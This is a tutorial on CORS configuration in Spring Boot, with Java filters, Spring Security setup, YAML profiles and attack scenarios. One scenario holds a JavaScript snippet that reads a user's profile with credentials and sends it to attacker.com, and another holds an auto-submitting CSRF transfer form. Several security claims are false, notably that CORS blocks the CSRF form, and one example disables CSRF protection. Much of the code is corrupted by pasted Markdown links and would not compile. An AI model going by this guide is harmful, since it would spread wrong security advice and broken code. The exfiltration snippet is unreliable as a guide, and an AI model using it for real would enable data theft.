# CORS Implementation & Security Protection Guide for Spring Boot 3.4.5

## Overview

Cross-Origin Resource Sharing (CORS) is a critical security mechanism that controls how web applications interact across different domains. This guide provides implementation details for Spring Boot 3.4.5 and explains how CORS protects your application.

---

## 🛡️ How CORS Protects Your Application

### 1. **Same-Origin Policy Enforcement**

CORS works by enforcing the browser's **Same-Origin Policy**, which prevents malicious websites from:

- Reading sensitive data from your API
- Making unauthorized requests on behalf of users
- Accessing authentication tokens or cookies

> **Example Threat**: Without CORS, a malicious website [`evil.com`](http://evil.com) could make requests to your API at [`yourapi.com`](http://yourapi.com) using the victim's cookies, potentially stealing data or performing unauthorized actions.
> 

### 2. **Preflight Request Validation**

For complex requests (POST, PUT, DELETE with custom headers), browsers send a **preflight request** (OPTIONS method) first:

```
OPTIONS /api/sensitive-data HTTP/1.1
Origin: [https://untrusted-site.com](https://untrusted-site.com)
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization, Content-Type
```

Your server can **reject** this preflight if the origin is not allowed, preventing the actual request.

### 3. **Credential Protection**

CORS prevents unauthorized access to:

- **HTTP cookies** (session tokens, authentication cookies)
- **Authorization headers** (JWT tokens, API keys)
- **Client certificates**

---

## 🔧 Implementation Methods

### Method 1: Global CORS Filter (Recommended)

```java
@Configuration
public class CorsConfig {
    
    @Bean
    public CorsFilter corsFilter() {
        CorsConfiguration config = new CorsConfiguration();
        
        // 🔒 Security: Only allow trusted origins
        config.setAllowedOrigins(List.of(
            "[http://localhost:3000](http://localhost:3000)",    // React dev server
            "[https://yourdomain.com](https://yourdomain.com)"     // Production frontend
        ));
        
        // 🔒 Security: Restrict allowed headers
        config.setAllowedHeaders(List.of(
            "Origin", "Content-Type", "Accept", 
            "Authorization", "X-Requested-With"
        ));
        
        // 🔒 Security: Only allow necessary HTTP methods
        config.setAllowedMethods(List.of(
            "GET", "POST", "PUT", "DELETE", "OPTIONS"
        ));
        
        // 🔒 Security: Enable credentials for authenticated requests
        config.setAllowCredentials(true);
        
        // ⚡ Performance: Cache preflight response for 1 hour
        config.setMaxAge(3600L);
        
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", config);
        
        return new CorsFilter(source);
    }
}
```

### Method 2: WebMvcConfigurer Approach

```java
@Configuration
public class WebConfig implements WebMvcConfigurer {
    
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins("[http://localhost:3000](http://localhost:3000)", "[https://yourdomain.com](https://yourdomain.com)")
            .allowedMethods("GET", "POST", "PUT", "DELETE", "OPTIONS")
            .allowedHeaders("*")
            .allowCredentials(true)
            .maxAge(3600);
    }
}
```

### Method 3: Spring Security Integration

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))
            .csrf(csrf -> csrf.disable())
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/public/**").permitAll()
                .anyRequest().authenticated()
            );
        
        return [http.build](http://http.build)();
    }
    
    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        
        // 🔒 Production-ready security settings
        configuration.setAllowedOrigins(List.of(
            "[https://yourdomain.com](https://yourdomain.com)",
            "[https://admin.yourdomain.com](https://admin.yourdomain.com)"
        ));
        configuration.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
        configuration.setAllowedHeaders(List.of("Authorization", "Content-Type"));
        configuration.setAllowCredentials(true);
        configuration.setMaxAge(86400L); // 24 hours
        
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", configuration);
        return source;
    }
}
```

### Method 4: Controller-Level CORS

```java
@RestController
@RequestMapping("/api")
public class ApiController {
    
    // 🔒 Specific endpoint protection
    @CrossOrigin(
        origins = {"[https://trustedclient.com](https://trustedclient.com)"},
        methods = {RequestMethod.GET, [RequestMethod.POST](http://RequestMethod.POST)},
        allowedHeaders = {"Content-Type", "Authorization"},
        maxAge = 3600
    )
    @PostMapping("/sensitive-data")
    public ResponseEntity<String> handleSensitiveData(@RequestBody String data) {
        return ResponseEntity.ok("Data processed securely");
    }
}
```

---

## 🚨 Security Threats CORS Prevents

### 1. **Cross-Site Request Forgery (CSRF)**

**Attack Scenario**:

```html
<!-- Malicious website trying to make unauthorized request -->
<form action="[https://yourbank.com/transfer](https://yourbank.com/transfer)" method="POST">
    <input name="to" value="attacker-account">
    <input name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

**CORS Protection**: The browser blocks this request because [`malicious.com`](http://malicious.com) is not in your allowed origins.

### 2. **Data Theft via JavaScript**

**Attack Scenario**:

```jsx
// Malicious site trying to steal user data
fetch('[https://yourapi.com/user/profile](https://yourapi.com/user/profile)', {
    credentials: 'include'  // Include cookies
})
.then(response => response.json())
.then(data => {
    // Send stolen data to attacker's server
    fetch('[https://attacker.com/steal](https://attacker.com/steal)', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
```

**CORS Protection**: Request is blocked at the preflight stage if origin is not allowed.

### 3. **Session Hijacking**

**Attack Scenario**: Malicious sites trying to use authenticated user's session cookies to access protected resources.

**CORS Protection**: `allowCredentials: true` only works with explicit origins, never with wildcards (`*`).

---

## 🔧 Production Security Configuration

### Environment-Specific Settings

```java
@Configuration
public class CorsSecurityConfig {
    
    @Value("${app.cors.allowed-origins}")
    private List<String> allowedOrigins;
    
    @Bean
    @Profile("production")
    public CorsFilter productionCorsFilter() {
        CorsConfiguration config = new CorsConfiguration();
        
        // 🔒 Production: Strict origin control
        config.setAllowedOrigins(allowedOrigins); // From application-prod.yml
        
        // 🔒 Production: Minimal headers
        config.setAllowedHeaders(List.of(
            "Authorization", "Content-Type", "X-Requested-With"
        ));
        
        // 🔒 Production: Only necessary methods
        config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
        
        config.setAllowCredentials(true);
        config.setMaxAge(86400L); // 24 hours for performance
        
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/api/**", config);
        
        return new CorsFilter(source);
    }
    
    @Bean
    @Profile("development")
    public CorsFilter developmentCorsFilter() {
        CorsConfiguration config = new CorsConfiguration();
        
        // 🔓 Development: More permissive for testing
        config.setAllowedOriginPatterns(List.of("[http://localhost:*](http://localhost:*)"));
        config.setAllowedHeaders(List.of("*"));
        config.setAllowedMethods(List.of("*"));
        config.setAllowCredentials(true);
        config.setMaxAge(3600L);
        
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", config);
        
        return new CorsFilter(source);
    }
}
```

### Application Properties

```yaml
# application-prod.yml
app:
  cors:
    allowed-origins:
      - [https://yourdomain.com](https://yourdomain.com)
      - [https://admin.yourdomain.com](https://admin.yourdomain.com)
      - [https://mobile.yourdomain.com](https://mobile.yourdomain.com)

# application-dev.yml
app:
  cors:
    allowed-origins:
      - [http://localhost:3000](http://localhost:3000)
      - [http://localhost:3001](http://localhost:3001)
      - [http://localhost:8080](http://localhost:8080)
```

---

## 🧪 Testing Your CORS Configuration

### Test Endpoint

```java
@RestController
public class CorsTestController {
    
    @GetMapping("/cors-test")
    public ResponseEntity<Map<String, Object>> corsTest(HttpServletRequest request) {
        Map<String, Object> response = new HashMap<>();
        response.put("origin", request.getHeader("Origin"));
        response.put("method", request.getMethod());
        response.put("userAgent", request.getHeader("User-Agent"));
        response.put("timestamp", [Instant.now](http://Instant.now)().toString());
        response.put("corsEnabled", true);
        
        return ResponseEntity.ok(response);
    }
    
    @PostMapping("/cors-test-post")
    public ResponseEntity<String> corsTestPost(@RequestBody Map<String, Object> data) {
        return ResponseEntity.ok("CORS POST request successful: " + data.toString());
    }
}
```

### Browser Testing

```jsx
// Test from browser console on different domains
fetch('[http://localhost:8080/cors-test](http://localhost:8080/cors-test)', {
    method: 'GET',
    credentials: 'include'
})
.then(response => response.json())
.then(data => console.log('CORS test result:', data))
.catch(error => console.error('CORS blocked:', error));
```

---

## ⚠️ Common Security Mistakes

### ❌ **Never Use Wildcards with Credentials**

```java
// 🚨 DANGEROUS - Security vulnerability
config.setAllowedOrigins(List.of("*"));
config.setAllowCredentials(true); // This combination is forbidden
```

### ❌ **Overly Permissive Headers**

```java
// 🚨 DANGEROUS - Allows any header
config.setAllowedHeaders(List.of("*"));
```

### ❌ **Missing Method Restrictions**

```java
// 🚨 DANGEROUS - Allows dangerous methods
config.setAllowedMethods(List.of("*")); // Includes TRACE, CONNECT, etc.
```

### ✅ **Secure Configuration**

```java
// 🔒 SECURE - Explicit and restrictive
config.setAllowedOrigins(List.of("[https://trustedclient.com](https://trustedclient.com)"));
config.setAllowedHeaders(List.of("Content-Type", "Authorization"));
config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
config.setAllowCredentials(true);
```

---

## 🔍 Monitoring & Logging

### CORS Request Logging

```java
@Component
public class CorsLoggingFilter implements Filter {
    
    private static final Logger logger = LoggerFactory.getLogger(CorsLoggingFilter.class);
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                        FilterChain chain) throws IOException, ServletException {
        
        HttpServletRequest httpRequest = (HttpServletRequest) request;
        String origin = httpRequest.getHeader("Origin");
        
        if (origin != null) {
            [logger.info](http://logger.info)("CORS request from origin: {} to endpoint: {}", 
                       origin, httpRequest.getRequestURI());
        }
        
        chain.doFilter(request, response);
    }
}
```

### Security Headers Logging

```java
@Component
public class SecurityHeadersFilter implements Filter {
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                        FilterChain chain) throws IOException, ServletException {
        
        HttpServletResponse httpResponse = (HttpServletResponse) response;
        
        // Add additional security headers
        httpResponse.setHeader("X-Content-Type-Options", "nosniff");
        httpResponse.setHeader("X-Frame-Options", "DENY");
        httpResponse.setHeader("X-XSS-Protection", "1; mode=block");
        
        chain.doFilter(request, response);
    }
}
```

---

## 📊 CORS Flow Diagram

```
1. Browser → Server: OPTIONS /api/data
   Headers: Origin: [https://client.com](https://client.com)
            Access-Control-Request-Method: POST
            Access-Control-Request-Headers: Authorization

2. Server checks CORS configuration:
   ✅ Is "[https://client.com](https://client.com)" in allowedOrigins?
   ✅ Is "POST" in allowedMethods?
   ✅ Is "Authorization" in allowedHeaders?

3. Server → Browser: 200 OK
   Headers: Access-Control-Allow-Origin: [https://client.com](https://client.com)
            Access-Control-Allow-Methods: POST
            Access-Control-Allow-Headers: Authorization
            Access-Control-Max-Age: 3600

4. Browser → Server: POST /api/data
   Headers: Origin: [https://client.com](https://client.com)
            Authorization: Bearer token123
   Body: {"data": "secure payload"}

5. Server → Browser: 200 OK
   Headers: Access-Control-Allow-Origin: [https://client.com](https://client.com)
   Body: {"result": "success"}
```

---

## 🎯 Best Practices Summary

1. **✅ Use explicit origins** - Never use wildcards in production
2. **✅ Minimize allowed headers** - Only include necessary headers
3. **✅ Restrict HTTP methods** - Only allow required methods
4. **✅ Environment-specific configs** - Different settings for dev/prod
5. **✅ Monitor CORS requests** - Log and analyze cross-origin traffic
6. **✅ Regular security reviews** - Audit CORS settings periodically
7. **✅ Test thoroughly** - Verify CORS works correctly across all clients

> **Remember**: CORS is your first line of defense against cross-origin attacks. Configure it properly to protect your users and data while maintaining necessary functionality.
>